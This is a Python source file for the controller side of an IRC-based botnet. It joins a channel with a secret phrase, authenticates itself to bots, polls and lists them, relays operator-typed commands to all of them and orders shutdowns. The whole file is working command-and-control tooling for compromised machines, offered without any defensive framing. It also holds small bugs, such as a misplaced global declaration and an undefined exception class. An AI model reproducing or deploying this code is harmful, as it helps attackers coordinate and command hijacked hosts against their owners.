import socket
import sys
import irc
import random, string
import threading, time

QUIT = False
HOST = ''
PORT = 0000
CHAN = ''
PASS = ''
BOTS = []

'''
    shutdown(sender, overflow)
    sender - message sender
    overflow - actual message received from buffer (handles overflowing messages due to concurrency)
'''
def shutdown(sender, overflow):
    if sender in BOTS:
        print(sender + " shutting down")
        BOTS.remove(sender)
    if "PRIVMSG" in overflow:
        (prefix, command, args) = parsemsg(':'+overflow.split(':',1)[1])
        sender = prefix.split("!")[0]
        shutdown(sender, args[1])
    return
'''
    checks for bot status every 5s
'''
def status_check():
    while not QUIT:
        #print("Status check!")
        # authenticate self to new bots
        s.send(privmsg(CHAN, PASS).encode('utf-8'))
        time.sleep(0.2)
        # ask status from bots
        s.send(privmsg(CHAN, "status").encode('utf-8'))
        time.sleep(5)
''' 
    handles income of bot nicknames as well as potential overflow
    as a result of concurrency in buffer
'''
def handle_bot_status(sender, overflow):
    #print("sender in handle_bot_stat: "+sender)
    #print("Bot detected!")
    if sender not in BOTS:
        BOTS.append(sender)
    # handle overflow of msg from other bots
    if "PRIVMSG" in overflow:
        (prefix, command, args) = parsemsg(':'+overflow.split(':',1)[1])
        sender = prefix.split("!")[0]
        #print("in handle_bot_status: "+sender)
        handle_bot_status(sender, args[1])
    return
def privmsg(destination, msg):
    ret = "PRIVMSG "+destination+" :"+msg+"\r\n"
    return ret

def parsemsg(s):
    """Breaks a message from an IRC server into its prefix, command, and arguments.
    """
    prefix = ''
    trailing = []
    if not s:
       raise IRCBadMessage("Empty line.")
    if s[0] == ':':
        prefix, s = s[1:].split(' ', 1)
    if s.find(' :') != -1:
        s, trailing = s.split(' :', 1)
        args = s.split()
        args.append(trailing)
    else:
        args = s.split()
    command = args.pop(0)
    return prefix, command, args

# returns random 5 char string
def generate_nickname(length):
    return ''.join(random.choice(string.ascii_lowercase) for i in range(length))

def recv():
    while not QUIT:
        response = s.recv(1024).decode("utf-8")
        #print(response)

        if 'PING' in response:
            msg = response.split(':')
            print('PONG '+msg[1]+'\r\n')
            s.send(('PONG '+msg[1]+'\r\n').encode("utf-8"))

        elif response != '':

            # args[1].strip() = message
            (prefix, command, args)= parsemsg(response)
            sender = prefix.split("!")[0]

            #print("Sender: "+sender)
            ## debug msgs
            #print("prefix: " + prefix)
            #print("command: " + command)
            #for p in args: print ("arg["+p.strip()+"]")
            #print()

            # if nickname already in use
            if command == "433":
                NICK = 'controller_'+generate_nickname(5)
                s.send(("NICK "+NICK+"\r\n").encode('utf-8'))

            elif command == "PRIVMSG":
                #print(response)
                # if msg is a bot nickname
                if "bot_" in args[1]:
                    if sender != ' ' and sender != '':
                        handle_bot_status(sender, args[1])
                if "shutting down" in args[1]:
                    shutdown(sender, args[1])
    return

def send():
    
    # authenticate self to existing bots in channel
    s.send(privmsg(CHAN, PASS).encode('utf-8'))
    
    while not QUIT:
        msg = input("Command > ")
        if msg == "quit":
            print("Sending "+(msg+"\r"))
            s.send((msg+"\r\n").encode('utf-8'))
            print("Terminating "+NICK+"...")
            global QUIT 
            QUIT = True
        elif msg == "status":
            print("Found %d bots:"%len(BOTS))
            for b in BOTS:
                print(b)
        elif msg == "shutdown":
            bots_before = len(BOTS)
            s.send(privmsg(CHAN, "shutdown").encode('utf-8'))
            # wait for bot reply for 5s
            time.sleep(5)
            bots_after = bots_before - len(BOTS)
            print("Total: %d bots shut down"%bots_after)
        else:
            print("Sending "+privmsg(CHAN, msg))
            s.send(privmsg(CHAN, msg).encode('utf-8'))
    return

if __name__ == "__main__":

    global QUIT
    QUIT = False
    
    if len(sys.argv) == 5:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
        CHAN = sys.argv[3]
        PASS = sys.argv[4]
        NICK = "controller_"+generate_nickname(5)

        try:
            s = socket.socket()
            s.connect((HOST, PORT))
            s.send("PASS {}\r\n".format(PASS).encode("utf-8"))
            s.send("NICK {}\r\n".format(NICK).encode("utf-8"))
            s.send("USER c 0 * :{}\r\n".format(NICK).encode("utf-8"))
            s.send("JOIN {}\r\n".format(CHAN).encode("utf-8"))

            recv_thread = threading.Thread(target = recv)
            recv_thread.daemon = True
            recv_thread.start()

            send_thread = threading.Thread(target=send)
            send_thread.daemon = True
            send_thread.start()

            status_thread = threading.Thread(target=status_check)
            status_thread.daemon = True
            status_thread.start()

        except Exception as e:
            print("{0}".format(e))
        finally:
            status_thread.join()
            recv_thread.join()
            send_thread.join()
            sys.exit(1)
    
    else:
        print("USAGE: python3 controller.py <hostname> <port> <channel> <secret-phrase>")
        sys.exit(1)